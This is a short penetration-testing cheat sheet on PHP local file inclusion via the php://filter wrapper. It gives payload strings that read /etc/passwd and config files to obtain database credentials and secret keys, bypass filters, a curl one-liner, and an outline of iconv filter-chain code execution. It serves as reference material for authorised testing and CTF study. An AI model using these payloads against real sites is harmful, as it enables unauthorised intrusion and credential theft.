# LFI — PHP Filter Chain

## 📌 What It Is
PHP `php://filter` wrapper used to read source code of PHP files (which are normally executed, not displayed) by base64-encoding them via filter chain.

## 🔍 How to Find It
If LFI works on PHP file but executes (no readable output) → use `php://filter/convert.base64-encode/resource=index.php`. Decode base64 → source.

## 🧪 How to Test It
1. `?file=php://filter/convert.base64-encode/resource=config.php`\n2. Base64-decode response → see source.\n3. Find DB credentials, secret keys, etc.\n4. Chain UTF-8/UTF-16 iconv filters to RCE (newer technique).

## 💣 How to Exploit It
Reach RCE: chain `convert.iconv` filters to produce arbitrary bytes → call as `data://text/plain;base64,<bytes>` → execute.

## 🔄 Bypass Techniques
If base64 stripped → try other filters: `string.rot13`, `convert.iconv.UTF-8.UTF-16LE`, `zlib.deflate`.

## 🛠️ Tools
- php_filter_chain_generator (synacktiv)

## 🎯 Payloads
```\n?file=php://filter/convert.base64-encode/resource=/etc/passwd\n?file=php://filter/zlib.deflate/convert.base64-encode/resource=index.php\n```

## 📝 Real-World Examples
Synacktiv's filter-chain RCE research, multiple CTF / bug bounty.

## 🚩 Common Mistakes / Traps
Filter chain RCE only works in specific PHP versions and config; test on staging first.

## 📊 Severity & Impact
Critical (RCE).

## 🔗 References
Synacktiv blog, OffSec PHP filter abuse.

## ⚡ One-Liners
```bash\ncurl 'https://target/?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d\n```
